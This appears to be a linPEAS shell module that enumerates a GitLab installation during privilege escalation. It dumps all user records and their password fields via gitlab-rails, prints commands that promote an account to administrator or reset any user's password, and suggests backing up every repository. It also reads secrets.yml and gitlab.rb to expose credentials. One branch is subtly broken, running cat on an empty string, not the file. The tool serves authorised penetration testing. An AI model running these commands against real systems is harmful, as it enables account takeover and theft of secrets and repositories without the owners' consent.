# Title: Software Information - Gitlab
# ID: SI_Gitlab
# Author: Carlos Polop
# Last Update: 22-08-2023
# Description: Searching GitLab related files
# License: GNU GPL
# Version: 1.0
# Functions Used: print_2title
# Global Variables: $DEBUG
# Initial Functions:
# Generated Global Variables:
# Fat linpeas: 0
# Small linpeas: 1


if [ "$(command -v gitlab-rails || echo -n '')" ] || [ "$(command -v gitlab-backup || echo -n '')" ] || [ "$PSTORAGE_GITLAB" ] || [ "$DEBUG" ]; then
  print_2title "Searching GitLab related files"
  #Check gitlab-rails
  if [ "$(command -v gitlab-rails || echo -n '')" ]; then
    echo "gitlab-rails was found. Trying to dump users..."
    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }' | sed -${E} "s,email|password,${SED_RED},"
    echo "If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: \"youruser@example.com\"); user.admin = TRUE; user.save!'"
    echo "Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: \"admin@example.com\"); user.password = \"pass_peass_pass\"; user.password_confirmation = \"pass_peass_pass\"; user.save!'"
    echo ""
  fi
  if [ "$(command -v gitlab-backup || echo -n '')" ]; then
    echo "If you have enough privileges, you can create a backup of all the repositories inside gitlab using 'gitlab-backup create'"
    echo "Then you can get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'"
    echo ""
  fi
  #Check gitlab files
  printf "%s\n" "$PSTORAGE_GITLAB" | sort | uniq | while read f; do
    if echo $f | grep -q secrets.yml; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#"
    elif echo $f | grep -q gitlab.yml; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "" | grep -A 4 "repositories:"
    elif echo $f | grep -q gitlab.rb; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,email|user|password,${SED_RED},"
    fi
    echo ""
  done
  echo ""
fi